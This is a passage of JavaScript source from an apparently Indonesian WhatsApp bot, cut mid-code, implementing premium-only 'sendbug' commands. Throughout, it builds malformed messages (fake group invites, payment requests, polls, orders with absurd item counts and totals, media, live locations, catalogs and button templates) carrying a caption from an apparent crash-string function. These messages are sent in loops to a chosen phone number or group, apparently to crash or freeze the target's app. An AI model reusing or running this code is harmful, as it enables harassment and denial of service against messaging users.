var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
if (mentionByReply) {
await setReply('Sending...')
for (let i = 0; i < args[0]; i++) {
Araa.relayMessage(mentionByReply, buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(mentionByReply, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(mentionByReply, pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(mentionByReply, order.message, { messageId: order.key.id })
Araa.relayMessage(mentionByReply, audio.message, { messageId: audio.key.id })
Araa.relayMessage(mentionByReply, image.message, { messageId: image.key.id })
Araa.relayMessage(mentionByReply, document.message, { messageId: document.key.id })
Araa.relayMessage(mentionByReply, liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(mentionByReply, sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(mentionByReply, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(mentionByReply, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByReply.split('@')[0]}`)
} else if (mentionByTag[0] && isGroup) {
await setReply('Sending...')
for (let i = 0; i < args[1]; i++) {
Araa.relayMessage(mentionByTag[0], buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(mentionByTag[0], { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(mentionByTag[0], pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(mentionByTag[0], order.message, { messageId: order.key.id })
Araa.relayMessage(mentionByTag[0], audio.message, { messageId: audio.key.id })
Araa.relayMessage(mentionByTag[0], image.message, { messageId: image.key.id })
Araa.relayMessage(mentionByTag[0], document.message, { messageId: document.key.id })
Araa.relayMessage(mentionByTag[0], liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(mentionByTag[0], sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(mentionByTag[0], `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(mentionByTag[0], { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${mentionByTag[0].split('@')[0]}`)
} else if (q.split("|")[0] && q.split("|")[1]) {
await setReply('Sending...')
for (let i = 0; i < q.split("|")[1]; i++) {
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', order.message, { messageId: order.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', audio.message, { messageId: audio.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', image.message, { messageId: image.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', document.message, { messageId: document.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net', { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
setReply(`Berhasil mengirim Bug ke Nomer ${q.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '')}`)
}
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbuginvitegc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
let buginvite = generateWAMessageFromContent(from,{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
contextInfo: { forwardingScore: 150, isForwarded: true },
},
},
{ quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, buginvite.message, { messageId: buginvite.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpaymentgc':
case 'sendbugpaygc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
await setReply('Sending...')
Araa.relayMessage(q, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugpollinggc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var bugreact = await Araa.sendMessage(from, { react: { text: '0️', key: { remoteJid: from, fromMe: true, id: m.id } } })
var pollCreation = generateWAMessageFromContent(
from,
proto.Message.fromObject({
pollCreationMessage: {
name: 'HALO DEKK 🥶',
options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],
selectableOptionsCount: 5,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, pollCreation.message, { messageId: pollCreation.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugtroligc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(
from,
proto.Message.fromObject({
orderMessage: {
orderId: '594071395007984',
orderImage: messa.imageMessage,
itemCount: 100000000000,
status: 'INQUIRY',
surface: 'CATALOG',
message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
jpegThumbnail: ofrply,
orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
sellerJid: '628979185922@s.whatsapp.net',
token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',
totalAmount1000: '500000000000000',
totalCurrencyCode: 'IDR',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, order.message, { messageId: order.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugaudiogc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var audio = generateWAMessageFromContent(
from,
proto.Message.fromObject({
audioMessage: {
url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',
mimetype: 'audio/mpeg',
fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',
fileLength: '258330',
seconds: 16,
ptt: false,
mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',
fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',
directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',
mediaKeyTimestamp: '1657190832',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, audio.message, { messageId: audio.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugimagegc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var image = generateWAMessageFromContent(
from,
proto.Message.fromObject({
imageMessage: {
url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',
mimetype: 'image/jpeg',
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',
fileLength: '42521',
height: 426,
width: 640,
mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',
fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',
directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',
mediaKeyTimestamp: '1657286523',
jpegThumbnail: messa.imageMessage,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, image.message, { messageId: image.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugdocumentgc':
case 'sendbugdocgc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var document = generateWAMessageFromContent(
from,
proto.Message.fromObject({
documentMessage: {
url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',
mimetype: 'application/octet-stream',
title: '.dev',
fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',
pageCount: 0,
mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',
fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',
directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',
mediaKeyTimestamp: '1657288637',
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, document.message, { messageId: document.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugstickergc':
case 'sendbugstickgc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var sticker = generateWAMessageFromContent(
from,
proto.Message.fromObject({
stickerMessage: {
url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',
fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',
fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',
mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',
mimetype: 'image/webp',
height: 64,
width: 64,
directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',
fileLength: '7774',
mediaKeyTimestamp: '1657290167',
isAnimated: false,
},
}),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, sticker.message, { messageId: sticker.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbuglokasigc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var liveLocation = generateWAMessageFromContent(
from,
proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),
{ userJid: from, quoted: bugkontak })
await setReply('Sending...')
Araa.relayMessage(q, liveLocation.message, { messageId: liveLocation.key.id })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugkataloggc':
case 'sendbugcataloggc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
await setReply('Sending...')
Araa.sendKatalog(q, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugbuttongc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
await setReply('Sending...')
Araa.sendMessage(q, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break
case 'sendbugspamgc':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q) return setReply('Masukan id gc')
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6283144394823@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ofrply, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: bugkontak })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: bugkontak })
var messa = await prepareWAMessageMedia({ image: ofrply }, { upload: Araa.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ofrply,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: bugkontak })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: bugkontak })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: bugkontak })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: bugkontak })
var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: bugkontak })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: bugkontak })
Araa.relayMessage(q, buginvite.message, { messageId: buginvite.key.id })
Araa.relayMessage(q, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
Araa.relayMessage(q, pollCreation.message, { messageId: pollCreation.key.id })
Araa.relayMessage(q, order.message, { messageId: order.key.id })
Araa.relayMessage(q, audio.message, { messageId: audio.key.id })
Araa.relayMessage(q, image.message, { messageId: image.key.id })
Araa.relayMessage(q, document.message, { messageId: document.key.id })
Araa.relayMessage(q, liveLocation.message, { messageId: liveLocation.key.id })
Araa.relayMessage(q, sticker.message, { messageId: sticker.key.id })
Araa.sendKatalog(q, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ofrply, { quoted: bugkontak })
Araa.sendMessage(q, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
setReply(`Berhasil mengirim Bug`)
} catch (err) {
console.log(err)
setReply('Gagal mengirim bug, Terjadi Error')
}
break  
case 'sendbuginvitegcv':
try {
if (!isPremium && !m.key.fromMe) return onlyPrem()
if (!q.split("|")[0]) return setReply('Masukan id gc')
if (!q.split("|")[1]) return setReply('jumlahnya?')
let buginvite = generateWAMessageFromContent(from,{
groupInviteMessage: {
groupJid: '6283144394823@g.us',
inviteCode: 'UkJdqTXupAtmDwo4',
inviteExpiration: '1643553084',
invitetime: '1643293887000',
groupName: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
thumbnail: ofrply,
caption: `ৡৢ͜͡𝟒𝟎𝟒-𝐀𝐳𝐭𝐞𝐜𝐳 ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
